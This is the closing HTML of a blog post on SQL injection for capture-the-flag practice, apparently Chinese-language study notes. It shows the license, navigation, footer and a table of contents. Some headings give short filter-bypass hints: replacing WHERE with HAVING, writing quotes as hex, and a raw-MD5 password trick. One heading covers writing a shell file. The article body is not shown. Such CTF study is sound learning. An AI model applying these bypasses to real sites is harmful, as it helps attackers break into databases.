+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://1768161086.github,io">userq</a></p><p> <span>Link:  </span><a href="http://1768161086.github,io/2025/01/29/sql%E6%B3%A8%E5%85%A5/">http://1768161086.github,io/2025/01/29/sql%E6%B3%A8%E5%85%A5/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2025/01/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化"><span>< PreviousPost</span><br><span class="prevTitle">反序列化</span></a><a class="nextSlogan" href="/2025/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传"><span>NextPost ></span><br><span class="nextTitle">文件上传</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-sql%E7%9B%B8%E5%85%B3%E6%9F%A5%E8%AF%A2%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">1.sql相关查询命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%9B%B8%E5%85%B3%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">2.相关过滤绕过方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">3.报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-handler%E7%94%A8%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">4..handler用法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E5%86%99%E5%85%A5shell%E6%96%87%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">5.写入shell文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-sqlmap%E8%B7%91"><span class="toc-number">5.</span> <span class="toc-text">6.sqlmap跑</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web181-1-and-0-or-1%E6%BB%A1%E8%B6%B3%E4%B8%A4%E8%BE%B9%E7%9A%84%E6%9D%A1%E4%BB%B6%E8%BF%94%E5%9B%9Etrue"><span class="toc-number">5.1.</span> <span class="toc-text">web181:1 and 0 or 1满足两边的条件返回true</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web183-select%E4%B8%8D%E8%83%BD%E7%94%A8%EF%BC%8C%E5%B0%B1%E5%8F%AA%E8%83%BD%E9%80%89%E6%8B%A9%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%88%96%E8%80%85%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E4%BA%86%E3%80%82"><span class="toc-number">5.2.</span> <span class="toc-text">web183:select不能用，就只能选择布尔盲注或者时间盲注了。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web184-where%E5%8F%AF%E4%BB%A5%E7%94%A8having%E4%BB%A3%E6%9B%BF%EF%BC%8C%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%8F%AF%E4%BB%A5%E7%94%A8-%E6%8B%AC%E5%8F%B7-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E3%80%82"><span class="toc-number">5.3.</span> <span class="toc-text">web184:where可以用having代替，单双引号可以用 括号+十六进制。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web185-%E6%95%B0%E5%AD%97%E3%80%81%E5%B0%96%E6%8B%AC%E5%8F%B7%EF%BC%8C-%E3%80%81-%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%EF%BC%8C%E5%B0%B1%E8%A6%81%E8%80%83%E8%99%91%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0%E7%BA%AF%E5%AD%97%E6%AF%8D%E7%9A%84%E5%8C%B9%E9%85%8D%E3%80%82"><span class="toc-number">5.4.</span> <span class="toc-text">web185:数字、尖括号，^、%被过滤了，就要考虑如何构造纯字母的匹配。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web187-password-md5-POST-password-true"><span class="toc-number">5.5.</span> <span class="toc-text">web187.$password &#x3D; md5($_POST[&#39;password&#39;],true);</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Basectf-Sql-Inject-or-RCE"><span class="toc-number">5.6.</span> <span class="toc-text">Basectf Sql Inject or RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-or-Sql-Inject"><span class="toc-number">5.6.1.</span> <span class="toc-text">RCE or Sql Inject</span></a></li></ol></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
